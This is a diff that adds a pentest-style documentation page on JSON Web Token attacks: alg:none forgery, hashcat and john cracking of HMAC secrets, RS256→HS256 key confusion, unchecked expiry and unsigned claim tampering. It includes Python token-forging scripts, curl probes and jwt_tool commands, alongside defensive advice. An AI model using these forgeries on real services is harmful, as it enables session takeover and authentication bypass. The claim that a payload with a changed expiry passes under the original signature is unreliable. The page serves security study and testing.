@@ -1,0 +1,326 @@
+---
+title: JWT
+description: JSON Web Token attacks - alg:none, weak signing keys, key confusion, expired-but-accepted tokens, and claim tampering.
+mitre: [T1539, T1606]
+d3fend: [D3-MENCR, D3-CH]
+impact: [SessionTakeover, AuthBypass]
+owasp: [A02, A07]
+sidebar:
+  order: 11
+  label: JWT
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+JWTs are stateless authentication tokens carrying claims (user, role, expiry) signed by the server. The signature is supposed to prevent tampering - when the signature check is weak or skipped, tampering becomes account-takeover.
+
+```
+# Recognize a JWT - three base64 segments separated by dots
+eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiaHRiIiwicm9sZSI6InVzZXIifQ.signature
+
+# Attack 1 - alg:none (server accepts unsigned tokens)
+Change header alg to "none", strip signature
+{"alg":"HS256"}  →  {"alg":"none"}
+
+# Attack 2 - weak HMAC key (brute-force the secret)
+hashcat -a 0 -m 16500 jwt.txt rockyou.txt
+
+# Attack 3 - algorithm confusion (RS256 → HS256, use public key as HMAC secret)
+# Many JWT libraries accept any signature when the algorithm is changed
+
+# Attack 4 - expired but accepted (server doesn't check exp claim)
+Set exp far in the future or remove it entirely
+```
+
+Success indicator: server accepts a JWT you constructed with claims you chose - typically a different user or elevated role.
+
+## JWT structure
+
+```
+header.payload.signature
+```
+
+Each segment is base64url-encoded JSON. Header declares the algorithm, payload contains the claims, signature is computed over the first two segments.
+
+### Example decoded
+
+```
+Header   {"alg":"HS256","typ":"JWT"}
+Payload  {"sub":"htbuser","role":"user","iat":1647135274,"exp":1647138874}
+```
+
+Standard payload claims:
+
+```
+sub        Subject (user identifier)
+iat        Issued at (Unix timestamp)
+exp        Expires at (Unix timestamp)
+nbf        Not valid before (Unix timestamp)
+iss        Issuer
+aud        Audience
+jti        JWT ID (unique identifier for revocation)
+```
+
+Application-specific claims (`role`, `permissions`, `email`, etc.) are added freely. The cleanly-separated payload is exactly what makes JWT attractive for tampering attempts.
+
+### Decoding a JWT
+
+```bash
+# Just split on dots and base64url-decode the parts
+TOKEN="eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiaHRiIiwicm9sZSI6InVzZXIifQ.signature"
+echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null
+echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null
+```
+
+Base64URL is a variant of base64 with `-` and `_` instead of `+` and `/`, and no padding. The `base64 -d` may complain about padding - append `=` characters to make the length a multiple of 4.
+
+Easier: paste the token at [jwt.io](https://jwt.io) for a parsed view (privacy aside - never paste production tokens to third-party services).
+
+## Attack 1 - `alg:none`
+
+The original JWT vulnerability. Set the `alg` header to `none` and drop the signature; some libraries accept this as a valid unsigned token.
+
+```
+# Original
+header   {"alg":"HS256"}
+payload  {"user":"htb","role":"user"}
+signature  XYZ
+
+# Attack
+header   {"alg":"none"}
+payload  {"user":"htb","role":"admin"}
+signature  (empty)
+```
+
+Full constructed token:
+
+```
+eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiaHRiIiwicm9sZSI6ImFkbWluIn0.
+```
+
+Note the trailing dot - the signature section is empty but the dot remains.
+
+### Variations to try
+
+```
+"alg": "none"
+"alg": "None"
+"alg": "NONE"
+"alg": "nOnE"
+"alg": ""
+```
+
+Case sensitivity is library-specific - some libraries normalize, some don't. Try all variants.
+
+### Detection / exploitation
+
+```python
+import base64
+import json
+
+# Decode the original token
+parts = token.split('.')
+header = json.loads(base64.urlsafe_b64decode(parts[0] + '==').decode())
+payload = json.loads(base64.urlsafe_b64decode(parts[1] + '==').decode())
+
+# Modify
+header['alg'] = 'none'
+payload['role'] = 'admin'
+
+# Re-encode
+def b64url(d):
+    return base64.urlsafe_b64encode(json.dumps(d, separators=(',',':')).encode()).decode().rstrip('=')
+
+forged = f"{b64url(header)}.{b64url(payload)}."
+print(forged)
+```
+
+### Defending against this
+
+Most modern JWT libraries reject `alg:none` by default. The bug appears in:
+- Older library versions (pre-2015 - the original disclosure period)
+- Custom implementations
+- Multi-language stacks where a token signed by Library A is verified by Library B
+
+## Attack 2 - Weak HMAC key
+
+When `alg` is `HS256` (or `HS384`, `HS512`), the signature is an HMAC over the header+payload using a secret key. If the secret is weak (short, dictionary word, predictable), brute-force the secret offline:
+
+```bash
+# hashcat mode 16500 = JWT HMAC
+hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+
+# john the ripper
+john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
+```
+
+`jwt.txt` should contain just the full JWT. Hashcat extracts the parts and tests each wordlist entry as the HMAC secret.
+
+### Common weak secrets
+
+```
+secret
+secret123
+jwt-secret
+your-256-bit-secret
+changeme
+password
+<companyname>
+<companyname>123
+```
+
+If hashcat reveals the secret, you can forge arbitrary tokens. Test the secret:
+
+```python
+import jwt
+
+SECRET = "found-secret"
+payload = {"sub": "admin", "role": "admin", "exp": 9999999999}
+forged = jwt.encode(payload, SECRET, algorithm='HS256')
+print(forged)
+```
+
+### Defending against this
+
+Use cryptographic-strength random keys (256+ bits of entropy). Never use dictionary words. Rotate keys when they leak.
+
+## Attack 3 - Algorithm confusion (RS256 → HS256)
+
+Subtle and devastating. When the server's verification code looks like:
+
+```python
+# Vulnerable
+verify(token, public_key)
+```
+
+…and the JWT library picks the verification algorithm from the token's header, an attacker can:
+
+1. Take the server's public key (RSA public keys are public by design - often on a `.well-known/jwks.json` endpoint)
+2. Change the token's `alg` from `RS256` to `HS256`
+3. Sign the token with HMAC using the public key as the HMAC secret
+4. Server reads `alg:HS256`, verifies the HMAC using the (public) key, validates the token
+
+The bug is that the server's "public key" is now being used as an HMAC secret - which the attacker also has. The attacker can forge any token.
+
+### Exploitation
+
+```python
+import jwt
+
+# Read the server's public key (often at /.well-known/jwks.json or .pem)
+with open('server-public.pem') as f:
+    public_key = f.read()
+
+# Forge token signed with HMAC using the public key as the secret
+payload = {"sub": "admin", "role": "admin"}
+forged = jwt.encode(payload, public_key, algorithm='HS256')
+print(forged)
+```
+
+Note: `public_key` here is the literal text of the PEM file. The exact byte sequence matters - extra whitespace or line endings can change the HMAC and break the forgery.
+
+### Defending against this
+
+The server should enforce a specific algorithm rather than reading it from the token:
+
+```python
+# Correct
+jwt.decode(token, public_key, algorithms=['RS256'])
+```
+
+`algorithms=['RS256']` rejects HS256 tokens outright, defeating the confusion.
+
+## Attack 4 - Expiry not checked
+
+Some applications validate the signature but don't check `exp` (expiry) or `nbf` (not-before). Tokens are accepted long after they should have expired - useful when you've captured an old token (cached in logs, leaked in Git history, etc.).
+
+### Testing
+
+Capture a valid token. Note its `exp` claim. Wait until past `exp`. Resubmit:
+
+```bash
+curl -H "Authorization: Bearer $OLD_TOKEN" https://<TARGET>/api/me
+```
+
+- 401 Unauthorized → expiry is enforced
+- 200 OK with valid response → expiry is not enforced (bug)
+
+### Tampering exp
+
+If signature is unforgeable but expiry is unchecked:
+
+```python
+# Decode payload, set exp far in the future
+import time
+payload['exp'] = int(time.time()) + 365*86400         # 1 year from now
+# Re-encode without changing signature - the server won't notice
+```
+
+This only works when the server checks the signature but not the expiry separately - a strange but documented failure mode.
+
+## Attack 5 - Claim tampering with no signature check
+
+The simplest case: server doesn't verify the signature at all (developer mistake, debug mode left on). Modify any claim, leave the signature unchanged (or empty):
+
+```python
+payload['role'] = 'admin'
+# Resubmit with original signature → still works
+```
+
+Detection:
+
+```bash
+# Submit a token with a deliberately-wrong signature
+curl -H "Authorization: Bearer ${HEADER}.${PAYLOAD}.WRONGSIGNATURE" https://<TARGET>/api/me
+
+# If response is 200 with expected data → signature isn't being checked at all
+```
+
+A surprisingly common pattern - applications that "use JWT for sessions" sometimes treat them as opaque blobs and trust the contents.
+
+## Tooling
+
+For systematic testing:
+
+```bash
+# jwt_tool - comprehensive JWT testing
+# https://github.com/ticarpi/jwt_tool
+python3 jwt_tool.py $TOKEN -M pb               # playbook mode - tries common attacks
+python3 jwt_tool.py $TOKEN -X a                # alg:none variants
+python3 jwt_tool.py $TOKEN -X k -pk pubkey.pem # key confusion attack
+python3 jwt_tool.py $TOKEN -C -d rockyou.txt   # crack weak HMAC
+
+# Burp Suite - JWT Editor extension (BApp Store)
+# Provides UI for header/payload editing and signature operations
+```
+
+## Detection-only checks
+
+```bash
+# Identify whether the application uses JWTs at all
+# Check Authorization headers, cookies, response bodies
+
+# In a captured request
+curl -s -H "Authorization: Bearer $TOKEN" https://<TARGET>/api/me
+
+# Look for three-segment dot-separated structures
+# That's the surest "this is a JWT" signal
+
+# Check the algorithm and confirm strength
+echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null
+# Look for: "alg":"HS256"  / "RS256" / "ES256" / "none"
+```
+
+## Notes
+
+- **JWT is convenient and frequently misused.** The "stateless session" argument is real but most applications don't actually need that property - and the tradeoffs (no easy revocation, larger cookies, complex algorithm handling) often outweigh the benefit.
+- **Algorithm confusion is library-version-dependent.** PyJWT and node-jsonwebtoken both had this bug in older versions. Most patched versions (post-2017) require explicit algorithm specification. The bug is mostly historical at this point but appears occasionally in legacy systems.
+- **`kid` header injection.** A separate attack: the `kid` (key ID) header tells the server which key to use for verification. If the server reads this from a database or file system based on the attacker-supplied value, SQL injection / path traversal in the `kid` is possible. Out of scope for this overview - see jwt_tool's `-X` modes.
+- **Refresh tokens are usually JWTs too.** When testing JWT auth, look for both access tokens (short-lived, sent on every request) and refresh tokens (long-lived, used to get new access tokens). Refresh tokens are higher-value targets because of the longer lifetime.
+
+<Aside type="caution">
+JWT tokens often contain real user data in the payload (email, roles, group memberships, sometimes more). When demonstrating an attack, redact this content from any report or screenshot - the payload contents can be PII or sensitive in their own right.
+</Aside>
+
+This page is a starter - JWT has enough attack surface for several dedicated pages (key confusion in depth, JWS vs JWE, ECDSA signature malleability, JWK injection). Those exist as planned expansions; for now, the attacks above cover the operationally common cases.
